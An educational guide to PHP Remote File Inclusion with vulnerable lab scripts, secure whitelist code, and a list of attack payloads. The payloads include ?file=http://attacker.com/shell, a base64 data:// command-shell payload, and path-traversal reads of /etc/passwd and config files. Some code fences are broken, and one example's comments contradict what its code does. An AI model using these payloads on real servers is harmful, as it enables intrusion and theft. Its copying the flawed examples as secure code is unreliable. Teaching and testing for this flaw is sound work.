# Remote File Inclusion (RFI) in PHP

## What is Remote File Inclusion (RFI)?

Remote File Inclusion (RFI) is a **critical vulnerability** that allows an attacker to include and execute code from a remote server by exploiting PHP scripts that include files based on user input.

## How RFI Works

RFI occurs when:

1. PHP's `allow_url_include` directive is enabled
2. User input is directly used in file inclusion functions without proper validation
3. An attacker can specify a remote URL containing malicious code

## Enabling RFI (Testing Purposes Only - NOT Recommended in Production)

### Step 1: Edit PHP Configuration

Open the PHP configuration file (e.g., PHP 7.3 on Apache):

bash

```bash
vim /etc/php/7.3/apache2/php.ini
```

### Step 2: Set the Directive

Find and set the following directive:

ini

```ini
allow_url_include = On
```

### Step 3: Restart Apache

Apply the changes:

bash

```bash
systemctl restart apache2.service
```

## Understanding `allow_url_include`

|Configuration|Description|Default Value|Risk Level|
|---|---|---|---|
|`allow_url_include`|Allows PHP to include remote files via URLs|Off|**High** if set to On (can enable RFI attacks)|

## Example of Vulnerable PHP Code

### Basic Vulnerable Script (remote-file-inclusion-1.php)

php

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Remote File Inclusion</title>
</head>
<body>
    <h1>Remote File Inclusion</h1>
    
    <?php
    if (isset($_REQUEST['file'])) {
        include($_REQUEST['file']); // Vulnerable to RFI if allow_url_include = On
    }
    ?>
</body>
</html>
```

### How the Attack Works

1. **The PHP script includes a file based on the `file` parameter in the request**
2. **If PHP's `allow_url_include` directive is set to `On` in php.ini, the script will fetch and include remote files when specified via a URL**

### Attack Example

If `allow_url_include` is set to `On`, and an attacker requests:

```
http://example.com/index.php?page=http://attacker.com/malicious.php
```

**Result:** The malicious PHP code hosted on the attacker's server will be executed on the victim's server.

## Security Recommendations

### 🔒 Primary Defenses

1. **Keep `allow_url_include` set to `Off` in production**
    - This is the default and most important protection
2. **Avoid including files based on unsanitized user input**
    - Never directly use `$_GET`, `$_POST`, or `$_REQUEST` values in include statements
3. **Use whitelisting or strict validation for any file includes**
    - Only allow specific, predefined files to be included
4. **Update PHP to versions where this feature is disabled by default**
    - Newer PHP versions have better security defaults

### 🛡️ Additional Security Measures

- **Input validation and sanitization**
- **Use absolute paths instead of relative paths**
- **Implement proper access controls**
- **Regular security audits and code reviews**

## Secure Code Examples

### Example 1: Whitelist Approach

php

```php
<?php
$allowed_files = [
    'home' => 'pages/home.php',
    'about' => 'pages/about.php',
    'contact' => 'pages/contact.php'
];

$page = $_GET['page'] ?? 'home';

if (array_key_exists($page, $allowed_files)) {
    include $allowed_files[$page];
} else {
    include 'pages/404.php';
}
?>
```

### Example 2: Path Validation

php

```php
<?php
$page = $_GET['page'] ?? '';
$page = basename($page); // Remove directory traversal attempts
$file_path = 'pages/' . $page . '.php';

// Check if file exists and is within allowed directory
if (file_exists($file_path) && strpos(realpath($file_path), realpath('pages/')) === 0) {
    include $file_path;
} else {
    include 'pages/404.php';
}
?>
```

## Key Takeaways

- **RFI is a critical security vulnerability** that can lead to complete system compromise
- **`allow_url_include` should always be disabled in production environments**
- **Never trust user input** when including files
- **Use whitelisting and validation** for any dynamic file inclusion
- **Regular security testing** is essential to identify such vulnerabilities

## Testing and Detection

### Manual Testing

- Check if `allow_url_include` is enabled: `php -m | grep -i url`
- Test with remote URLs in file inclusion parameters
- Look for error messages that reveal file paths

### Automated Tools

- Use vulnerability scanners to detect RFI vulnerabilities
- Code analysis tools can identify unsafe include patterns
- Regular penetration testing


# Remote File Inclusion (RFI) Vulnerability Examples

## Example 1: remote-file-inclusion-2.php

html

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Remote File Inclusion</title>
</head>
<body>

<h1>Remote File Inclusion</h1>

<?php
if (isset($_REQUEST["file"])) {
    $remote_file = $_REQUEST["file"] . ".html";
    include($remote_file);
}
?>

</body>
</html>
```

### How it Works

- The script looks for the `file` parameter in the URL query string
- It appends `.html` to the value provided
- It uses `include()` to load the specified file dynamically

## Example 2: remote-file-inclusion-3.php

html

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Remote File Inclusion</title>
</head>
<body>

<h1>Remote File Inclusion</h1>

<?php
if (isset($_REQUEST["file"])) {
    $remote_file = $_REQUEST["file"] . ".js";
    require_once($remote_file);
}
?>

</body>
</html>
```

### Explanation

- The script takes a `file` parameter from the URL query string
- It appends the `.js` extension to the value
- It includes that file using `require_once()`, which stops further script execution on failure

## Example 3: remote-file-inclusion-4.php

html

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Remote File Inclusion</title>
</head>
<body>

<h1>Remote File Inclusion</h1>

<?php
if (isset($_REQUEST["file"])) {
    $remote_file = $_REQUEST["file"] . ".php";
    require_once($remote_file);
}
?>

</body>
</html>
```

### How it Works

- The script accepts a `file` parameter from the HTTP request
- It appends `.php` to the user-supplied value
- The resulting filename or URL is included via `require_once()`


# 🎯 Remote File Inclusion (RFI) Vulnerability - Complete Educational Guide

## 📚 **What is Remote File Inclusion?**

Remote File Inclusion is a web application vulnerability that occurs when an application dynamically includes external files based on user-supplied input without proper validation. Attackers can exploit this to execute malicious code on the server.

---

## 🔍 **The Vulnerable Code Examples from Your Screenshots**

### **Example 4: Basic Vulnerable RFI**

php

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Remote File Inclusion</title>
</head>
<body>

<h1>Remote File Inclusion</h1>

<?php
if (isset($_REQUEST["file"])) {
    $remote_file = $_REQUEST["file"] . ".php";
    require_once($remote_file);
}
?>

</body>
</html>
```

**⚠️ Why it's vulnerable:**

- User input is directly appended with `.php` and included without ANY validation
- No sanitization of the `file` parameter
- Allows both remote and local file inclusion

---

### **Example 5: URL Scheme Check (Weak Protection)**

php

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Remote File Inclusion</title>
</head>
<body>

<h1>Remote File Inclusion</h1>

<?php
if (isset($_REQUEST["file"])) {
    // Append .php extension to the requested file
    $remote_file = $_REQUEST["file"] . ".php";
    
    // Basic check to prevent remote URL inclusion
    if (preg_match('/^http|https/', $remote_file)) {
        require_once($remote_file);  // Include local file only
    } else {
        echo "Error";
    }
}
?>

</body>
</html>
```

**🔴 Security Issues:**

- Only checks URLs starting exactly with `http` or `https`
- **Bypass methods:**
    - Alternative protocols: `ftp://`, `file://`, `data://`
    - Case variations: `HTtp://`, `hTTp://`
    - URL encoding tricks
    - Local file paths: `../../../etc/passwd`

---

### **Example 7: Domain Whitelist (Better but Not Perfect)**

php

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Remote File Inclusion</title>
</head>
<body>

<h1>Remote File Inclusion</h1>

<?php
if (isset($_REQUEST["file"])) {
    $remote_file = $_REQUEST["file"] . ".php";
    
    // Allow only files from domain armourinfosec.com
    if (preg_match('/\.armourinfosec\.com/', $remote_file)) {
        require_once($remote_file);
    } else {
        echo "Error";
    }
}
?>

</body>
</html>
```

**📊 How It Works:**

- Appends `.php` to the file parameter
- Checks if the resulting string contains `.armourinfosec.com` using regex
- Only if check passes, includes the file

**⚠️ Still vulnerable to:**

- Path traversal if attacker controls files on that domain
- DNS subdomain takeover
- No validation that resolved path is safe

---

### **Example 8: Filename Pattern Matching**

php

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Remote File Inclusion</title>
</head>
<body>

<h1>Remote File Inclusion</h1>

<?php
if (isset($_REQUEST["file"])) {
    $remote_file = $_REQUEST["file"] . ".php";
    
    // Only allow inclusion if file name contains 'phpinfo.php'
    if (preg_match('/\/phpinfo\.php/', $remote_file)) {
        require_once($remote_file);
    } else {
        echo "Error";
    }
}
?>

</body>
</html>
```

**📋 How It Works:**

- Appends `.php` to file parameter
- Checks if the resulting filename contains the exact string `/phpinfo.php`
- Only if check passes does it include the file using `require_once()`

**🟡 More restrictive but:**

- Still allows any path as long as it contains `/phpinfo.php`
- Example: `http://evil.com/phpinfo.php/../../malicious`

---

### **Example 9: Whitelist Array (Most Secure Approach)** ✅

php

````php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Remote File Inclusion</title>
</head>
<body>

<h1>Remote File Inclusion</h1>

<?php
// Whitelist of allowed PHP files
$files = array('phpinfo.php', 'index.php');

if (isset($_REQUEST["file"])) {
    $remote_file = $_REQUEST["file"] . ".php";
    
    // Include file only if in whitelist
    if (in_array($remote_file, $files)) {
        require_once($remote_file);
    } else {
        echo "Error";
    }
}
?>

</body>
</html>
```

**✅ How It Works:**
- Defines a whitelist array `$files` with allowed file names
- Appends `.php` to user input
- Uses `in_array()` to check if file is in whitelist
- Only includes if exact match found

**🟢 Best Practice because:**
- No path traversal possible
- No remote file inclusion possible
- Only pre-approved files can be included
- Simple and effective

---

## 💣 **Attack Payloads (Educational Purpose Only)**

### **1. FTP Protocol Payload**
```
Payload: ftp://192.168.1.6/phpinfo.php
Usage: ?file=ftp://192.168.1.6/phpinfo
```

**📝 Explanation:**
- Attacker hosts malicious PHP file (`phpinfo.php`) on FTP server at `192.168.1.6`
- When vulnerable app includes this, it fetches and executes the remote code
- Server must have `allow_url_include` enabled

---

### **2. Data URI Payload (Base64 Encoded)**
```
Payload: data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==

Usage: ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
````

**🔍 Decoded content:** `<?php phpinfo(); ?>`

**📝 How it works:**

- `data://` wrapper allows embedding base64-encoded PHP code directly in URL
- PHP decodes and executes this as inline PHP code if `allow_url_include` is enabled
- Bypasses file-based detection

**Base64 encoding example:**

php

````php
<?php phpinfo(); ?>
```
Encodes to: `PD9waHAgcGhwaW5mbygpOyA/Pg==`

---

### **3. Additional Bypass Techniques**

**Path Traversal:**
```
?file=../../../../etc/passwd
?file=..\..\..\..\windows\system32\drivers\etc\hosts
```

**Null Byte Injection (Old PHP versions):**
```
?file=http://evil.com/shell%00
```

**Protocol Variations:**
```
?file=file:///etc/passwd
?file=php://input
?file=php://filter/convert.base64-encode/resource=config
````

---

## 🛡️ **Security Analysis**

### **🔴 Example 4 - Completely Vulnerable**

- No validation whatsoever
- Allows any protocol, any file, any path
- Direct RFI and LFI possible

### **🟠 Example 5 - Weak Protection**

**Strengths:**

- ✅ Blocks basic `http://` and `https://` URLs

**Weaknesses:**

- ❌ Bypassable with `ftp://`, `data://`, `file://`
- ❌ Case manipulation: `HTtp://`
- ❌ Local file inclusion still possible
- ❌ No path sanitization

### **🟡 Example 7 - Moderate Protection**

**Strengths:**

- ✅ Restricts to specific domain
- ✅ Better than no validation

**Weaknesses:**

- ❌ Subdomain attacks possible
- ❌ DNS hijacking risk
- ❌ Pattern matching can be bypassed
- ❌ No realpath validation

### **🟢 Example 8 - Good But Narrow**

**Strengths:**

- ✅ Very specific filename requirement
- ✅ Harder to exploit

**Weaknesses:**

- ❌ Limited functionality
- ❌ Pattern still matchable in malicious paths

### **🟢 Example 9 - Best Practice** ⭐

**Strengths:**

- ✅ Whitelist approach
- ✅ No path traversal
- ✅ No remote inclusion
- ✅ Simple and secure
- ✅ Only approved files

**Minimal weaknesses:**

- Still need to ensure whitelisted files are safe

---

## 🔐 **Complete Security Recommendations**

### **1. Whitelist Approach (RECOMMENDED)** ⭐

php

```php
<?php
$allowed_files = [
    'home' => '/var/www/pages/home.php',
    'about' => '/var/www/pages/about.php',
    'contact' => '/var/www/pages/contact.php'
];

$page = $_GET['page'] ?? 'home';

if (array_key_exists($page, $allowed_files)) {
    include $allowed_files[$page];
} else {
    include $allowed_files['home'];
}
?>
```

---

### **2. Disable Dangerous PHP Settings**

ini

```ini
; In php.ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html
```

---

### **3. Sanitize and Validate Input**

php

```php
<?php
$file = $_GET['file'] ?? '';

// Remove any path components
$file = basename($file);

// Allow only alphanumeric, dash, underscore
$file = preg_replace('/[^a-zA-Z0-9_-]/', '', $file);

// Build safe path
$safe_path = __DIR__ . '/includes/' . $file . '.php';

// Verify file exists and is within allowed directory
if (file_exists($safe_path) && realpath($safe_path)) {
    $real = realpath($safe_path);
    $base = realpath(__DIR__ . '/includes/');
    
    if (strpos($real, $base) === 0) {
        include $safe_path;
    }
}
?>
```

---

### **4. Use Absolute Paths with realpath()**

php

```php
<?php
$base_path = '/var/www/html/includes/';
$file = $_GET['file'];

$full_path = realpath($base_path . $file . '.php');

// Ensure resolved path is within base directory
if ($full_path && strpos($full_path, $base_path) === 0 && file_exists($full_path)) {
    include $full_path;
} else {
    die('Invalid file');
}
?>
```

---

### **5. Modern Approach - Use Routing**

php

```php
<?php
$routes = [
    'home' => 'HomeController',
    'about' => 'AboutController',
    'contact' => 'ContactController'
];

$page = $_GET['page'] ?? 'home';

if (isset($routes[$page])) {
    $controller = new $routes[$page]();
    $controller->render();
}
?>
```

---

## ⚠️ **Critical Security Checklist**

- [ ]  **Never** use user input directly in `include`, `require`, `require_once`, `include_once`
- [ ]  **Always** use whitelist validation
- [ ]  **Disable** `allow_url_include` in php.ini
- [ ]  **Use** `basename()` to remove path components
- [ ]  **Validate** with `realpath()` to prevent directory traversal
- [ ]  **Set** `open_basedir` restriction
- [ ]  **Log** all file inclusion attempts
- [ ]  **Implement** proper error handling (don't reveal paths)
- [ ]  **Use** a framework with built-in protections
- [ ]  **Regular** security audits and code reviews

---

## 📖 **Testing Methodology**

### **1. Manual Testing**

bash

````bash
# Test basic RFI
?file=http://attacker.com/shell

# Test protocol bypass
?file=ftp://attacker.com/shell
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Test LFI
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd

# Test null byte (old PHP)
?file=../../../../etc/passwd%00

# Test wrapper
?file=php://filter/convert.base64-encode/resource=config
```

### **2. Automated Tools**
- **Burp Suite** - Intruder with RFI/LFI payloads
- **OWASP ZAP** - Active scan for file inclusion
- **Nikto** - Web server scanner
- **Wfuzz** - Web fuzzer for vulnerabilities
````